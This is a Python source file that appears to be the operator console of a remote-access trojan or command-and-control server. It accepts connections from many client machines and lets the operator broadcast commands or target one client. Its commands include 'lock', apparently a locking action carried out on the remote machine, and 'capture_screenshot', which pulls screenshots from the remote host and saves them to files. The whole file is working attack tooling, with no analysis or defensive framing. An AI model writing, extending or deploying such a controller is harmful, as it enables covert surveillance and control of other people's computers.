import socket
import os
from datetime import datetime as dt
import zlib
import time
import sys
import threading

IP = sys.argv[1]
PORT = int(sys.argv[2])
active = True
clients = {}  # Dictionary to store client connections and their info

# Set up the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Explicitly define address family and socket type
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reusing the address
sock.bind((IP, PORT))
sock.listen(5)
print("Server listening for incoming connections...")

# Compress and decompress data functions
def zdecomp(data):
    """ Decompress the received data. """
    try:
        return zlib.decompress(data)
    except Exception as e:
        print(f"Error decompressing data: {e}")
        return b""

def zcomp(data):
    """ Compress the data before sending. """
    return zlib.compress(data)

# Handle individual client connection
def handle_client_connection(conn, addr):
    print(f"{addr} has connected.")
    try:
        while active:
            try:
                command = input("[+] Enter command: ")
                if len(command) < 1:
                    print("No command entered.")
                    continue  # Continue to ask for a command

                if command == "lock":
                    conn.send(command.encode())
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    enc = conn.recv(fsize)
                    print(zdecomp(enc).decode("utf-8"))

                elif command == "capture_screenshot":
                    conn.send(command.encode())
                    print("Receiving file size ...")
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    print(f"File Size: {fsize}")
                    enc = conn.recv(fsize)
                    dec = zdecomp(enc)
                    filename = f"{str(dt.now()).replace(':', '-')}.png"
                    with open(filename, 'wb') as save:
                        save.write(dec)
                    print(f"Saved screenshot to {filename}")

                # Add more command handling as needed...
            except ConnectionError as e:
                print(f"Error during command execution with {addr}: {e}")
                break

    except Exception as e:
        print(f"Error handling client connection {addr}: {e}")
    finally:
        conn.close()
        del clients[addr]  # Remove client from the list when they disconnect
        print(f"Connection with {addr} closed.")

# Accept multiple clients concurrently
def accept_clients():
    while active:
        try:
            conn, addr = sock.accept()
            clients[addr] = conn  # Store the connection object and address
            print(f"New connection from {addr}")
            client_thread = threading.Thread(target=handle_client_connection, args=(conn, addr))
            client_thread.daemon = True  # Daemonize thread so it ends when the main program exits
            client_thread.start()
        except Exception as e:
            print(f"Error accepting new client connection: {e}")
            time.sleep(5)  # Retry connection after a short delay

# List clients and select one to interact with
def list_and_select_client():
    while active:
        print("\n[+] Active clients:")
        if not clients:
            print("No active clients connected.")
            return None

        for idx, addr in enumerate(clients.keys(), 1):
            print(f"{idx}. {addr}")
        
        try:
            selection = int(input("\nSelect client by number or enter 0 to send to all clients: "))
            if selection == 0:
                return None
            elif 1 <= selection <= len(clients):
                selected_client = list(clients.keys())[selection - 1]
                print(f"Selected client: {selected_client}")
                return selected_client
            else:
                print("Invalid selection, please try again.")
        except ValueError:
            print("Please enter a valid number.")

# Send a command to a specific client or all clients
def send_command_to_client(command, client_addr=None):
    if client_addr is None:
        # Send to all clients
        for conn in clients.values():
            conn.send(command.encode())
    else:
        conn = clients.get(client_addr)
        if conn:
            conn.send(command.encode())
        else:
            print(f"No client found with address {client_addr}")

# Main function to manage server operations
def main():
    # Start handling the client connections
    accept_thread = threading.Thread(target=accept_clients)
    accept_thread.daemon = True
    accept_thread.start()

    while active:
        selected_client = list_and_select_client()
        if selected_client:
            command = input("[+] Enter command to send to selected client: ")
            send_command_to_client(command, selected_client)
        else:
            command = input("[+] Enter command to send to all clients: ")
            send_command_to_client(command)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nServer is shutting down.")
        active = False
        sock.close()
